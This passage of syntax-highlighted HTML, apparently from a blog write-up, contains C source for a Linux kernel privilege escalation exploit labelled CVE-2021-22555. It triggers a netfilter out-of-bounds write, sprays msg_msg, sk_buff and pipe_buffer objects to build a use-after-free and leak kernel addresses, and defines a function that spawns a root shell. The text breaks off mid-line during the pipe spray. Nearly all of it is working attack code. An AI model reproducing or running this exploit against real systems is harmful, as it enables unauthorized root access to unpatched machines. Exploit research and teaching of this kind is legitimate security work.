class="class">&#123;</span></span><br><span class="line">    <span class="type">uint64_t</span>    next;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> </span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">long</span> mtype;</span><br><span class="line">    <span class="type">char</span> mtext[PRIMARY_MSG_SIZE - <span class="keyword">sizeof</span>(<span class="keyword">struct</span> msg_msg)];</span><br><span class="line">&#125;primary_msg;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> </span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">long</span> mtype;</span><br><span class="line">    <span class="type">char</span> mtext[SECONDARY_MSG_SIZE - <span class="keyword">sizeof</span>(<span class="keyword">struct</span> msg_msg)];</span><br><span class="line">&#125;secondary_msg;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * skb_shared_info need to take 320 bytes at the tail</span></span><br><span class="line"><span class="comment"> * so the max size of buf we should send is:</span></span><br><span class="line"><span class="comment"> * 1024 - 320 = 704</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">char</span> fake_secondary_msg[<span class="number">704</span>];</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">long</span> mtype;</span><br><span class="line">    <span class="type">char</span> mtext[<span class="number">0x1000</span> - <span class="keyword">sizeof</span>(<span class="keyword">struct</span> msg_msg) + <span class="number">0x1000</span> - <span class="keyword">sizeof</span>(<span class="keyword">struct</span> msg_msgseg)];</span><br><span class="line">&#125; oob_msg;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">uint64_t</span>    page;</span><br><span class="line">    <span class="type">uint32_t</span>    offset, len;</span><br><span class="line">    <span class="type">uint64_t</span>    ops;</span><br><span class="line">    <span class="type">uint32_t</span>    flags;</span><br><span class="line">    <span class="type">uint32_t</span>    padding;</span><br><span class="line">    <span class="type">uint64_t</span>    private;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buf_operations</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">uint64_t</span>    confirm;</span><br><span class="line">    <span class="type">uint64_t</span>    release;</span><br><span class="line">    <span class="type">uint64_t</span>    try_steal;</span><br><span class="line">    <span class="type">uint64_t</span>    get;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">errExit</span><span class="params">(<span class="type">char</span> *msg)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[31m\033[1m[x] Error: %s\033[0m\n&quot;</span>, msg);</span><br><span class="line">    <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">readMsg</span><span class="params">(<span class="type">int</span> msqid, <span class="type">void</span> *msgp, <span class="type">size_t</span> msgsz, <span class="type">long</span> msgtyp)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> msgrcv(msqid, msgp, msgsz - <span class="keyword">sizeof</span>(<span class="type">long</span>), msgtyp, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">writeMsg</span><span class="params">(<span class="type">int</span> msqid, <span class="type">void</span> *msgp, <span class="type">size_t</span> msgsz, <span class="type">long</span> msgtyp)</span></span><br><span class="line">&#123;</span><br><span class="line">    *(<span class="type">long</span>*)msgp = msgtyp;</span><br><span class="line">    <span class="keyword">return</span> msgsnd(msqid, msgp, msgsz - <span class="keyword">sizeof</span>(<span class="type">long</span>), <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">peekMsg</span><span class="params">(<span class="type">int</span> msqid, <span class="type">void</span> *msgp, <span class="type">size_t</span> msgsz, <span class="type">long</span> msgtyp)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> msgrcv(msqid, msgp, msgsz - <span class="keyword">sizeof</span>(<span class="type">long</span>), msgtyp, MSG_COPY | IPC_NOWAIT);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">buildMsg</span><span class="params">(<span class="keyword">struct</span> msg_msg *msg, <span class="type">uint64_t</span> m_list_next,</span></span><br><span class="line"><span class="params">    <span class="type">uint64_t</span> m_list_prev, <span class="type">uint64_t</span> m_type, <span class="type">uint64_t</span> m_ts, </span></span><br><span class="line"><span class="params">    <span class="type">uint64_t</span> next, <span class="type">uint64_t</span> security)</span></span><br><span class="line">&#123;</span><br><span class="line">    msg-&gt;m_list.next = m_list_next;</span><br><span class="line">    msg-&gt;m_list.prev = m_list_prev;</span><br><span class="line">    msg-&gt;m_type = m_type;</span><br><span class="line">    msg-&gt;m_ts = m_ts;</span><br><span class="line">    msg-&gt;next = next;</span><br><span class="line">    msg-&gt;security = security;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">spraySkBuff</span><span class="params">(<span class="type">int</span> sk_socket[SOCKET_NUM][<span class="number">2</span>], <span class="type">void</span> *buf, <span class="type">size_t</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; SOCKET_NUM; i++)</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; SK_BUFF_NUM; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// printf(&quot;[-] now %d, num %d\n&quot;, i, j);</span></span><br><span class="line">            <span class="keyword">if</span> (write(sk_socket[i][<span class="number">0</span>], buf, size) &lt; <span class="number">0</span>)</span><br><span class="line">                <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">freeSkBuff</span><span class="params">(<span class="type">int</span> sk_socket[SOCKET_NUM][<span class="number">2</span>], <span class="type">void</span> *buf, <span class="type">size_t</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; SOCKET_NUM; i++)</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; SK_BUFF_NUM; j++)</span><br><span class="line">            <span class="keyword">if</span> (read(sk_socket[i][<span class="number">1</span>], buf, size) &lt; <span class="number">0</span>)</span><br><span class="line">                <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">trigerOutOfBoundWrite</span><span class="params">(<span class="type">int</span> socket_fd)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> __<span class="title">attribute__</span>((__<span class="title">packed__</span>)) &#123;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">ipt_replace</span> <span class="title">replace</span>;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">ipt_entry</span> <span class="title">entry</span>;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">xt_entry_match</span> <span class="title">match</span>;</span></span><br><span class="line">        <span class="type">char</span> pad[<span class="number">0x108</span> + PRIMARY_MSG_SIZE - <span class="number">0x200</span> - <span class="number">0x2</span>];</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">xt_entry_target</span> <span class="title">target</span>;</span></span><br><span class="line">    &#125; data = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">    data.replace.num_counters = <span class="number">1</span>;</span><br><span class="line">    data.replace.num_entries = <span class="number">1</span>;</span><br><span class="line">    data.replace.size = <span class="keyword">sizeof</span>(data.entry) + <span class="keyword">sizeof</span>(data.match)</span><br><span class="line">            + <span class="keyword">sizeof</span>(data.pad) + <span class="keyword">sizeof</span>(data.target);</span><br><span class="line">    </span><br><span class="line">    data.entry.next_offset = <span class="keyword">sizeof</span>(data.entry) + <span class="keyword">sizeof</span>(data.match)</span><br><span class="line">            + <span class="keyword">sizeof</span>(data.pad) + <span class="keyword">sizeof</span>(data.target);</span><br><span class="line">    data.entry.target_offset = </span><br><span class="line">            <span class="keyword">sizeof</span>(data.entry) + <span class="keyword">sizeof</span>(data.match) + <span class="keyword">sizeof</span>(data.pad);</span><br><span class="line">    </span><br><span class="line">    data.match.u.user.match_size = <span class="keyword">sizeof</span>(data.match) + <span class="keyword">sizeof</span>(data.pad);</span><br><span class="line">    <span class="built_in">strcpy</span>(data.match.u.user.name, <span class="string">&quot;icmp&quot;</span>);</span><br><span class="line">    data.match.u.user.revision = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    data.target.u.user.target_size = <span class="keyword">sizeof</span>(data.target);</span><br><span class="line">    <span class="built_in">strcpy</span>(data.target.u.user.name, <span class="string">&quot;NFQUEUE&quot;</span>);</span><br><span class="line">    data.target.u.user.revision = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// partial overwrite the next object</span></span><br><span class="line">    <span class="keyword">if</span> (setsockopt(socket_fd, SOL_IP, IPT_SO_SET_REPLACE, &amp;data, <span class="keyword">sizeof</span>(data)))</span><br><span class="line">        <span class="keyword">if</span> (errno == ENOPROTOOPT)</span><br><span class="line">            errExit(<span class="string">&quot;ip_tables module is not loaded!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">getRootShell</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (getuid())</span><br><span class="line">        errExit(<span class="string">&quot;failed to gain the root!&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Succesfully gain the root privilege, trigerring root shell now...\033[0m\n&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv, <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span>         socket_fd;</span><br><span class="line">    <span class="type">int</span>         sk_sockets[SOCKET_NUM][<span class="number">2</span>];</span><br><span class="line">    <span class="type">int</span>         pipe_fd[PIPE_NUM][<span class="number">2</span>];</span><br><span class="line">    <span class="type">int</span>         msqid[MSG_QUEUE_NUM];</span><br><span class="line">    <span class="type">int</span>         victim_qid, real_qid;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span>  *<span class="title">nearby_msg</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span>  *<span class="title">nearby_msg_prim</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> *<span class="title">pipe_buf_ptr</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buf_operations</span> *<span class="title">ops_ptr</span>;</span></span><br><span class="line">    <span class="type">uint64_t</span>    victim_addr;</span><br><span class="line">    <span class="type">uint64_t</span>    kernel_base;</span><br><span class="line">    <span class="type">uint64_t</span>    kernel_offset;</span><br><span class="line">    <span class="type">uint64_t</span>    *rop_chain;</span><br><span class="line">    <span class="type">int</span>         rop_idx;</span><br><span class="line">    <span class="type">cpu_set_t</span>   cpu_set;</span><br><span class="line"></span><br><span class="line">    saveStatus();</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * Step.O</span></span><br><span class="line"><span class="comment">     * Initialization</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m\033[1m[+] CVE-2021-22555 Linux Privilege Escalation.\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ident namespace</span></span><br><span class="line">    <span class="keyword">if</span> (unshare(CLONE_NEWUSER) &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;failed to unshare(CLONE_NEWUSER)&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (unshare(CLONE_NEWNET) &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;failed to unshare(CLONE_NEWNET)&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// run the exp on specific core only</span></span><br><span class="line">    CPU_ZERO(&amp;cpu_set);</span><br><span class="line">    CPU_SET(<span class="number">0</span>, &amp;cpu_set);</span><br><span class="line">    sched_setaffinity(getpid(), <span class="keyword">sizeof</span>(cpu_set), &amp;cpu_set);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// socket to trigert off-by-null</span></span><br><span class="line">    <span class="keyword">if</span> ((socket_fd = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>)) &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;failed to create socket!&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// socket pairs to spray sk_buff</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; SOCKET_NUM; i++)</span><br><span class="line">        <span class="keyword">if</span> (socketpair(AF_UNIX, SOCK_STREAM, <span class="number">0</span>, sk_sockets[i]) &lt; <span class="number">0</span>)</span><br><span class="line">            errExit(<span class="string">&quot;failed to create socket pair!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * Step.I</span></span><br><span class="line"><span class="comment">     * build msg_queue, spray primary and secondary msg_msg,</span></span><br><span class="line"><span class="comment">     * and use OOB write to construct the overlapping</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\n\033[34m\033[1m[*] Step.I spray msg_msg, construct overlapping object\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Build message queue...&quot;</span>);</span><br><span class="line">    <span class="comment">// build 4096 message queue</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; MSG_QUEUE_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> ((msqid[i] = msgget(IPC_PRIVATE, <span class="number">0666</span> | IPC_CREAT)) &lt; <span class="number">0</span>)</span><br><span class="line">            errExit(<span class="string">&quot;failed to create msg_queue!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Spray primary and secondary msg_msg...&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(&amp;primary_msg, <span class="number">0</span>, <span class="keyword">sizeof</span>(primary_msg));</span><br><span class="line">    <span class="built_in">memset</span>(&amp;secondary_msg, <span class="number">0</span>, <span class="keyword">sizeof</span>(secondary_msg));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// spray primary and secondary message</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; MSG_QUEUE_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        *(<span class="type">int</span> *)&amp;primary_msg.mtext[<span class="number">0</span>] = MSG_TAG;</span><br><span class="line">        *(<span class="type">int</span> *)&amp;primary_msg.mtext[<span class="number">4</span>] = i;</span><br><span class="line">        <span class="keyword">if</span> (writeMsg(msqid[i], &amp;primary_msg, </span><br><span class="line">                <span class="keyword">sizeof</span>(primary_msg), PRIMARY_MSG_TYPE) &lt; <span class="number">0</span>)</span><br><span class="line">            errExit(<span class="string">&quot;failed to send primary msg!&quot;</span>);</span><br><span class="line"></span><br><span class="line">        *(<span class="type">int</span> *)&amp;secondary_msg.mtext[<span class="number">0</span>] = MSG_TAG;</span><br><span class="line">        *(<span class="type">int</span> *)&amp;secondary_msg.mtext[<span class="number">4</span>] = i;</span><br><span class="line">        <span class="keyword">if</span> (writeMsg(msqid[i], &amp;secondary_msg, </span><br><span class="line">                <span class="keyword">sizeof</span>(secondary_msg), SECONDARY_MSG_TYPE) &lt; <span class="number">0</span>)</span><br><span class="line">            errExit(<span class="string">&quot;failed to send secondary msg!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// create hole in primary msg_msg</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Create holes in primary msg_msg...&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; MSG_QUEUE_NUM; i += <span class="number">1024</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (readMsg(msqid[i], &amp;primary_msg, </span><br><span class="line">                <span class="keyword">sizeof</span>(primary_msg), PRIMARY_MSG_TYPE) &lt; <span class="number">0</span>)</span><br><span class="line">            errExit(<span class="string">&quot;failed to receive primary msg!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// triger off-by-null on primary msg_msg</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Trigger OOB write to construct the overlapping...&quot;</span>);</span><br><span class="line">    trigerOutOfBoundWrite(socket_fd);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// find the queues that have the same secondary msg_msg</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Checking whether succeeded to make overlapping...&quot;</span>);</span><br><span class="line">    victim_qid = real_qid = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; MSG_QUEUE_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> ((i % <span class="number">1024</span>) == <span class="number">0</span>)  <span class="comment">// the hole</span></span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (peekMsg(msqid[i], &amp;secondary_msg, </span><br><span class="line">                <span class="keyword">sizeof</span>(secondary_msg), <span class="number">1</span>) &lt; <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[x] error qid: %d\n&quot;</span>, i);</span><br><span class="line">            errExit(<span class="string">&quot;failed to receive secondary msg!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (*(<span class="type">int</span>*) &amp;secondary_msg.mtext[<span class="number">0</span>] != MSG_TAG)</span><br><span class="line">            errExit(<span class="string">&quot;failed to make corruption!&quot;</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (*(<span class="type">int</span>*) &amp;secondary_msg.mtext[<span class="number">4</span>] != i)</span><br><span class="line">        &#123;</span><br><span class="line">            victim_qid = i;</span><br><span class="line">            real_qid = *(<span class="type">int</span>*) &amp;secondary_msg.mtext[<span class="number">4</span>];</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (victim_qid &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;failed to make overlapping!&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] victim qid:\033[0m %d \033[32m\033[1m real qid: \033[0m %d\n&quot;</span>, </span><br><span class="line">            victim_qid, real_qid);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * Step.II</span></span><br><span class="line"><span class="comment">     * construct UAF</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\n\033[34m\033[1m[*] Step.II construct UAF\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// free the victim secondary msg_msg, then we get a UAF</span></span><br><span class="line">    <span class="keyword">if</span> (readMsg(msqid[real_qid], &amp;secondary_msg, </span><br><span class="line">                <span class="keyword">sizeof</span>(secondary_msg), SECONDARY_MSG_TYPE) &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;failed to receive secondary msg!&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m\033[1m[+] UAF construction complete!\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * Step.III</span></span><br><span class="line"><span class="comment">     * spray sk_buff to leak msg_msg addr</span></span><br><span class="line"><span class="comment">     * construct fake msg_msg to leak addr of UAF obj</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\n\033[34m\033[1m[*] Step.III spray sk_buff to leak kheap addr\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// spray sk_buff to construct fake msg_msg</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] spray sk_buff...&quot;</span>);</span><br><span class="line">    buildMsg((<span class="keyword">struct</span> msg_msg *)fake_secondary_msg, </span><br><span class="line">            *(<span class="type">uint64_t</span>*)<span class="string">&quot;arttnba3&quot;</span>, *(<span class="type">uint64_t</span>*)<span class="string">&quot;arttnba3&quot;</span>, </span><br><span class="line">            VICTIM_MSG_TYPE, <span class="number">0x1000</span> - <span class="keyword">sizeof</span>(<span class="keyword">struct</span> msg_msg), <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (spraySkBuff(sk_sockets, fake_secondary_msg, </span><br><span class="line">            <span class="keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;failed to spray sk_buff!&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// use fake msg_msg to read OOB</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] OOB read from victim msg_msg&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (peekMsg(msqid[victim_qid], &amp;oob_msg, <span class="keyword">sizeof</span>(oob_msg), <span class="number">1</span>) &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;failed to read victim msg!&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (*(<span class="type">int</span> *)&amp;oob_msg.mtext[SECONDARY_MSG_SIZE] != MSG_TAG)</span><br><span class="line">        errExit(<span class="string">&quot;failed to rehit the UAF object!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    nearby_msg = (<span class="keyword">struct</span> msg_msg*) </span><br><span class="line">            &amp;oob_msg.mtext[(SECONDARY_MSG_SIZE) - <span class="keyword">sizeof</span>(<span class="keyword">struct</span> msg_msg)];</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] addr of primary msg of msg nearby victim: \033[0m%llx\n&quot;</span>, </span><br><span class="line">            nearby_msg-&gt;m_list.prev);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// release and re-spray sk_buff to construct fake msg_msg</span></span><br><span class="line">    <span class="comment">// so that we can make an arbitrary read on a primary msg_msg</span></span><br><span class="line">    <span class="keyword">if</span> (freeSkBuff(sk_sockets, fake_secondary_msg, </span><br><span class="line">            <span class="keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;failed to release sk_buff!&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    buildMsg((<span class="keyword">struct</span> msg_msg *)fake_secondary_msg, </span><br><span class="line">            *(<span class="type">uint64_t</span>*)<span class="string">&quot;arttnba3&quot;</span>, *(<span class="type">uint64_t</span>*)<span class="string">&quot;arttnba3&quot;</span>, </span><br><span class="line">            VICTIM_MSG_TYPE, <span class="keyword">sizeof</span>(oob_msg.mtext), </span><br><span class="line">            nearby_msg-&gt;m_list.prev - <span class="number">8</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (spraySkBuff(sk_sockets, fake_secondary_msg, </span><br><span class="line">            <span class="keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;failed to spray sk_buff!&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] arbitrary read on primary msg of msg nearby victim&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (peekMsg(msqid[victim_qid], &amp;oob_msg, <span class="keyword">sizeof</span>(oob_msg), <span class="number">1</span>) &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;failed to read victim msg!&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (*(<span class="type">int</span> *)&amp;oob_msg.mtext[<span class="number">0x1000</span>] != MSG_TAG)</span><br><span class="line">        errExit(<span class="string">&quot;failed to rehit the UAF object!&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// cal the addr of UAF obj by the header we just read out</span></span><br><span class="line">    nearby_msg_prim = (<span class="keyword">struct</span> msg_msg*) </span><br><span class="line">            &amp;oob_msg.mtext[<span class="number">0x1000</span> - <span class="keyword">sizeof</span>(<span class="keyword">struct</span> msg_msg)];</span><br><span class="line">    victim_addr = nearby_msg_prim-&gt;m_list.next - <span class="number">0x400</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] addr of msg next to victim: \033[0m%llx\n&quot;</span>, </span><br><span class="line">            nearby_msg_prim-&gt;m_list.next);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] addr of msg UAF object: \033[0m%llx\n&quot;</span>, victim_addr);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * Step.IV</span></span><br><span class="line"><span class="comment">     * fix the header of UAF obj and release it</span></span><br><span class="line"><span class="comment">     * spray pipe_buffer and leak the kernel base</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\n\033[34m\033[1m[*] Step.IV spray pipe_buffer to leak kernel base\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// re-construct the msg_msg to fix it</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] fixing the UAF obj as a msg_msg...&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (freeSkBuff(sk_sockets, fake_secondary_msg, </span><br><span class="line">            <span class="keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;failed to release sk_buff!&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">memset</span>(fake_secondary_msg, <span class="number">0</span>, <span class="keyword">sizeof</span>(fake_secondary_msg));</span><br><span class="line">    buildMsg((<span class="keyword">struct</span> msg_msg *)fake_secondary_msg, </span><br><span class="line">            victim_addr + <span class="number">0x800</span>, victim_addr + <span class="number">0x800</span>, <span class="comment">// a valid kheap addr is valid</span></span><br><span class="line">            VICTIM_MSG_TYPE, SECONDARY_MSG_SIZE - <span class="keyword">sizeof</span>(<span class="keyword">struct</span> msg_msg), </span><br><span class="line">            <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (spraySkBuff(sk_sockets, fake_secondary_msg, </span><br><span class="line">            <span class="keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;failed to spray sk_buff!&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// release UAF obj as secondary msg</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] release UAF obj in message queue...&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (readMsg(msqid[victim_qid], &amp;secondary_msg, </span><br><span class="line">                <span class="keyword">sizeof</span>(secondary_msg), VICTIM_MSG_TYPE) &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;failed to receive secondary msg!&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// spray pipe_buffer</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] spray pipe_buffer...&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PIPE_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (pipe(pipe_fd[i]) &lt; <span class="number">0</span>)</span><br><span class="line">            errExit(<span class="string">&quot;failed to create pipe!&quot;</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// write something to activate it</span></span><br><span class="line">        <span class="keyword">if</span> (write(pipe_fd[i][<span class="number">1</span>], <span 